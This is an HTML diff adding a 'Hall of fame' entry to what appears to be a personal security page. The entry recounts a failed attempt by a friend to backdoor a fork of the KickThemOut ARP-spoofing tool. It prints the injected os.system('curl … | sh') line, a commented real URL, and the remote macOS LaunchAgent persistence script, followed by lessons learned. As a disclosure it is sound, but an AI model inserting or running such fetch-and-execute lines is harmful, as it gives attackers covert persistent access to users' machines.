@@ -186,6 +186,90 @@
                 </p>
 
                 <!-- HALL OF FAME -->
+                <h2>Hall of fame</h2>
+
+                <div class='bs-callout bs-callout-danger'>
+                    <div class='media'>
+                        <div class='media-left'>
+                            <img class='media-object' src='images/coto.jpg' width='120' />
+                        </div>
+                        <div class='media-body'>
+                            <h3 style='margin-top:0'>Apostolos (aka <a href='https://twitter.com/0xCoto'>@0xCoto</a>) <small>March 12th, 2017</small></h3>
+
+                            <h4>Outcome</h4>
+                            <p>
+                                <strong>Attack failed.</strong>
+                            </p>
+
+                            <h4>Full disclosure</h4>
+                            <p>
+                                Recently, my friend <a href='https://twitter.com/xdavidhu'>@xdavidhu</a> and I released
+                                a new infosec tool called KickThemOut, writen in python, which basically ARP-Spoofs people
+                                off a network (for bandwith, joy or anything else). Coto claimed that he had installed KickThemOut
+                                on his machine but explained that he got an error with <code>urllib2</code> when attempting to run 
+                                it. I found it a little stange considering that there hadn't been any issues about the library on 
+                                the git repo (except of one which had to do with the person's python config and was resolved). 
+                                That week, I had no time to look into the issue and since it was only affecting one person, I neglected it.
+                            </p>
+
+                            <p>
+                                Sometime later, Coto sent me a message declaring that he'd found the bug causing the error. 
+                                Subsequently, he told me that he'd forked KickThemOut and made some fixes which resolved the issue. 
+                                He then asked me if I could test it to see whether it runs smoothly on my own machine. 
+                                That's when I started thinking that there was something suspicious going on. 
+                                I decided that I should clone the forked repo and inspect it for malicious contents.
+                            </p>
+
+                            <p>
+                                After running a <code>diff</code> command to compare my python code with Coto's code, 
+                                I noticed something very suspicious. <br />
+                                He had injected the following line of code into the main <code>.py</code> file:
+                                <!-- <img src='images/coto_diff.png' width='500' style='padding-top: 4px;' /> -->
+                            </p>
+
+                            <blockquote>
+                                <!-- The LINK was: http://launched.zerowidth.com/plists/a0cccd80-e8eb-0134-c60f-0bdaa36c6e38/install :D -->
+                                os.system('curl [LINK] | sh')
+                            </blockquote>
+
+                            <p>
+                                The URL redirected to a file which contained the code:
+                            </p>
+
+                            <blockquote>
+                                echo downloading com.zerowidth.launched.appleupdate.plist...<br/>
+                                mkdir -p ~/Library/LaunchAgents<br/>
+                                curl -o ~/Library/LaunchAgents/com.zerowidth.launched.appleupdate.plist 
+                                http://launched.zerowidth.com/plists/a0cccd80-e8eb-0134-c60f-0bdaa36c6e38.xml<br/>
+                                echo installing com.zerowidth.launched.appleupdate.plist...<br/>
+                                launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdate.plist
+                            </blockquote>
+
+                            <!-- <img src='images/coto_sh.png' width='900' style='margin-bottom:10px;'/> -->
+
+                            <p>
+                                In brief, if I had chose to run the python file, a <code>curl</code> command would have 
+                                transfered the malicious file containing the precedent lines of code into my MacBook Pro and 
+                                run them in the form of a bash script. The script would have injected a new <code>plist</code> file,
+                                giving Coto full access to my machine every time I turned it on (on startup), using 
+                                the <code>RunAtLoad</code> plist command.
+
+                            <h4>Security correction</h4>
+                            <p>
+                                I should be very careful and diligent about running untrusted software. When I do decide to run 
+                                untrusted code, I should do so in a virtual environment (in a VM). If it's impossible to run within 
+                                a VM, I should not run it at all. Additionally, I could have also asked to use Google Hangouts for 
+                                screensharing, or insisted on installing Teamviewer.
+                            </p>
+
+                            <p>
+                                When it comes to policy, I will be more insisting and less polite, regardless of what my friends tell 
+                                me, and I will not break policy for convenience reasons.
+                            </p>
+
+                        </div>
+                    </div>
+                </div>
 
                 <div class='media'>
                     <div class='media-body'>
